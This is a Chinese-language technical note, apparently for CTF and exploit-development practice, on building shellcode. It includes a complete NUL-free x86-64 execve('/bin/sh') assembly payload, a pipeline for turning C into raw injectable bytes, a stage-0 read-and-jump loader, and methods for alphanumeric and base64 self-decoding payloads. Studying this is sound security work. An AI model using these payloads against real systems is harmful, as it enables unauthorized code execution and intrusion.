# Shellcode 与裸代码生成

## 先写约束

生成 shellcode 前明确：

- 架构、位数、endianness 和 syscall ABI；
- 可用长度、允许字符、是否禁止 NUL/换行/空白；
- 入口寄存器和栈状态；
- 代码页是否可执行，是否要先 ROP 到 `mprotect/mmap/read`；
- seccomp 允许的系统调用；
- shellcode 是否必须位置无关、可重入或保留寄存器。

pwntools 可以先生成基线：

```python
context.clear(arch="amd64", os="linux")
code = asm(shellcraft.sh())
print(len(code), code.hex())
```

再按坏字符约束手工缩短或编码，不要先抄一个“无 NUL shellcode”再猜它的 ABI。

## x86-64 `execve("/bin/sh", argv, NULL)` 示例

旧笔记通过分段构造负数常量避免直接嵌入字符串立即数：

```asm
xor eax, eax
mov bx, 0xff97
shl rbx, 16
mov bx, 0x8cd0
shl rbx, 16
mov bx, 0x9196
shl rbx, 16
mov bx, 0x9dd1
neg rbx
push rbx
push rsp
pop rdi
cdq
push rdx
push rdi
push rsp
pop rsi
mov al, 0x3b
syscall
```

使用前必须实际 assemble 后检查长度与坏字节：

```python
blob = asm(code)
assert b"\x00" not in blob
print(disasm(blob))
```

这里的目标是构造 `/bin/sh\0`、`argv={rdi,NULL}` 和 `envp=NULL`；“4 字长”不是准确的总长度描述，已不沿用旧标题。

## C 代码转裸 `.text`

适合逻辑较长、希望由编译器生成主体的 payload：

```bash
gcc -c payload.c -o payload.o \
  -Os -ffreestanding -fPIC -fno-stack-protector \
  -fno-asynchronous-unwind-tables -fno-unwind-tables \
  -fno-ident -nostdlib

# 裸代码不能留下未解析 relocation
readelf -rW payload.o
objdump -drwC -Mintel payload.o

objcopy -O binary --only-section=.text payload.o payload.bin
```

检查项：

- `readelf -rW` 应确认 `.text` 不依赖 GOT、PLT、外部函数或需要运行时修复的地址。
- 字符串常量可能被放到 `.rodata`；仅提取 `.text` 会丢失。可手工构造、放进指定 section，或在 linker script 中显式合并。
- 编译器可能插入栈保护、`memcpy/memset` 调用、浮点常量、异常展开和对齐填充；反汇编是最终事实。
- `-nostdlib` 只是不链接标准启动文件/库，不会自动让任意 C 代码成为位置无关 shellcode。
- 当裸入口不是普通 C 函数调用时，不能假设 `argc/argv/envp` 已在 `rdi/rsi/rdx`；Linux ELF 初始入口与被某个 harness 调用的函数入口是两种 ABI。

## linker script 的作用

自定义 linker script 可控制 section VMA、顺序与入口：

```ld
ENTRY(entry)

SECTIONS
{
  . = 0x10000;
  .text : { *(.text.entry) *(.text*) }
  .rodata : { *(.rodata*) }
  .data : { *(.data*) }
  .bss : { *(.bss*) *(COMMON) }
}
```

`-Wl,-T,script.ld` 会替换默认 linker script；生成可执行 ELF 和抽取可注入裸字节是两个不同目标。要裸 payload 时还得检查 program headers、relocation 和 section 间引用。

## 分阶段加载

输入长度很短但允许系统调用时，可先放一个 stage-0：

```text
read(0, writable_or_rwx, large_size)
jmp writable_or_rwx
```

NX 开启时，第二阶段地址必须原本可执行，或先通过 ROP/允许的系统调用调整权限。W^X 环境可能不允许同时 W+X，应使用先写后改 RX 的流程。

## 受限字符与输入变换

遇到 printable、alphanumeric、base64、toupper、ROT13 或逐 byte 运算限制时，先把问题拆成四层：

```text
发送 alphabet
  -> parser/decoder transformation
  -> 实际写入 bytes
  -> CPU 执行时的 code/data
```

处理顺序：

1. 穷举或建模每个可发送 byte 经变换后的像集；
2. 在像集中寻找最小 bootstrap：清寄存器、获得 PC/SP、写内存或跳转；
3. 用 xor/add/sub/shift、栈操作和合法指令合成缺失常量；
4. 若能自修改，先把 encoded stage 写入可执行且可写区域，再原地 decode；
5. 若只能 ROP，筛选“地址每个 byte 也满足 alphabet”的 gadget，并把副作用一起交给约束求解器；
6. 最终重新过完整 parser，检查 NUL、换行、大小写和最大长度。

[0CTF 2017 char](https://blog.dragonsector.pl/2017/03/0ctf-2017-char-shellcoding-132.html)展示了 printable gadget 地址与 Z3 常量合成；[SkullSecurity 的 base64/alphanumeric shellcode](https://www.skullsecurity.org/2017/solving-b-64-b-tuff-writing-base64-and-alphanumeric-shellcode)展示了自修改 decoder。可迁移的是“求变换逆像与最小 bootstrap”的方法，不是其中某组指令或地址。

## 自定义 syscall helper

用 inline asm 写 freestanding C 时列全 clobber，尤其 x86-64 `syscall` 会破坏 `rcx`、`r11` 和内存可见状态：

```c
static inline long syscall3(long nr, long a1, long a2, long a3)
{
    register long rax __asm__("rax") = nr;
    register long rdi __asm__("rdi") = a1;
    register long rsi __asm__("rsi") = a2;
    register long rdx __asm__("rdx") = a3;
    __asm__ volatile (
        "syscall"
        : "+a"(rax)
        : "D"(rdi), "S"(rsi), "d"(rdx)
        : "rcx", "r11", "memory"
    );
    return rax;
}
```

旧笔记中的 AFL forkserver C 原型包含特定 fd、entry ABI 和共享内存假设，保留在父目录作为实验记录，但不作为通用 shellcode 模板。

## 上游文档

- [GNU objcopy `--only-section`](https://sourceware.org/binutils/docs/binutils/objcopy.html)
- [GNU ld linker scripts](https://sourceware.org/binutils/docs/ld/Scripts.html)
